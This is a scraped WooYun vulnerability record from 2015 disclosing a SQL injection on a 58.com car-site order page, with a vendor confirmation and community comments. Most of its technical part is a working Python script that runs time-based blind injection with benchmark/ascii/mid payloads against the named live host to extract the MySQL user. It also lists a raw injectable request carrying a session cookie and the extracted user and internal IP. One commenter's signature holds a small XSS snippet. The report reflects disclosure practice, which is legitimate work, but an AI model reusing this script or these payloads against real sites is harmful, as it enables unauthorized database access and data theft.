{"id": 49382, "wybug_id": "wooyun-2015-0126775", "wybug_title": "58同城某站点MySQL注射（附脚本）", "wybug_corp": "58同城", "wybug_author": "lijiejie", "wybug_date": "2015-07-14 17:47", "wybug_open_date": "2015-08-30 12:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向公众公开  简要描述： 58同城某站点MySQL注射 详细说明：  注入点：\nGET /323224/order.html?prdid=*&sellerid=323224&source_detail=0000000000&type=3 HTTP/1.1User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)X-Requested-With: XMLHttpRequestReferer: http://che.58.comCookie: city=sh; PHPSESSID=abc90271f5786aac9cee29edb06929dc; cf_ref=http%3A%2F%2Fche.58.com%2Fgmac%2Fiframe_ApplyIntention_2013.phpHost: che.58.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*\n另一处注入点： \n/index.php?r=trainingOrder/save多个参数可注入\n   漏洞证明：  一sleep就挂了，用benchmark没问题。user()长度24，得到： \n[Done] MySQL user is carproducror@10.9.17.17l\n\n\n\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Cookie': 'city=sh; PHPSESSID=abc90271f5786aac9cee29edb06929dc; cf_ref=http%3A%2F%2Fche.58.com%2Fgmac%2Fiframe_ApplyIntention_2013.php',           'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',           'Referer': 'http://che.58.com'}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 25):    for payload in payloads:        s = '/323224/order.html?prdid=if(ascii(mid(user()from(%s)for(1)))=%s,benchmark(2000000,md5(1)),0)&sellerid=323224&source_detail=0000000000&type=3' % (i, ord(payload))        conn = httplib.HTTPConnection('che.58.com', timeout=30)        conn.request(method='GET',url=s, headers=headers)        t = time.time()        conn.getresponse().read()        conn.close()        print '.',        if time.time() - t > 1.5:            user += payload            print '\\n[in progress]', user,            time.sleep(1.0)            break        print '\\n[Done] MySQL user is %s' % user\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-16 12:17 厂商回复： 确认漏洞存在，辛苦了！URL库抓取的URL不够全，导致扫描器也没发现这个漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-14 17:47 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  lijiejie    \n     2015-07-14 17:48 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  lijiejie    \n     2015-07-14 17:49 |    \t\tcrown丶prince \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:19        | 我用双手成就你的梦想)\t\t \n  lijiejie     \n     2015-07-14 17:52 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  我放佛看到了司马又要加10K薪资了，从此成为高富帅。    \n     2015-07-14 17:55 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  这个好    \n     2015-07-14 18:00 |    \t\t北丐 \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:20        | )\t\t \n  司马又加10K    \n     2015-07-14 18:12 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  司马又加10K    \n     2015-07-14 19:45 |    \t\t百变屌丝 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:7        | 屌丝一个而且是百变的，临时工)\t\t \n  lijiejie    \n     2015-07-14 20:25 |    \t\t泪雨无魂 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:32        )\t\t \n  lijiejie     \n     2015-07-14 21:31 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  我真的觉得你们适合用这个https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter    \n     2015-07-15 07:50 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @xsser 帮审核下这个吧-_-|| http://www.wooyun.org/bugs/wooyun-2015-0126144/trace/0aabbdc26fe179828e261e6e9279a396    \n     2015-07-15 09:51 |    \t\t北丐 \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:20        | )\t\t \n  @xsser  剑神帮审核下这个吧  →_→  http://www.wooyun.org/bugs/wooyun-2015-0126483/trace/5f28c2403fbe36c2042563e1a0cbe2c8    \n     2015-07-16 12:46 |    \t\t路飞 \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 上帝恩赐，命运天定。希望之光，普照我身。...)\t\t \n  @xsser 剑圣帮核审下这个吧||=。= (这洞我都忘记了)http://www.wooyun.org/bugs/wooyun-2015-0115297/trace/def7a27123dc2e121ad854c1bcc3893dhttp://www.wooyun.org/bugs/wooyun-2015-0115235/trace/83a4bcd192f804480bb762088fe48b32    \n     2015-07-16 12:54 |    \t\twy007 \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:10        | 其实我是一名卧底...)\t\t \n  司马是哪位高人?    \n     2015-07-29 14:50 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @lijiejie  原来有内幕 我发现了~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}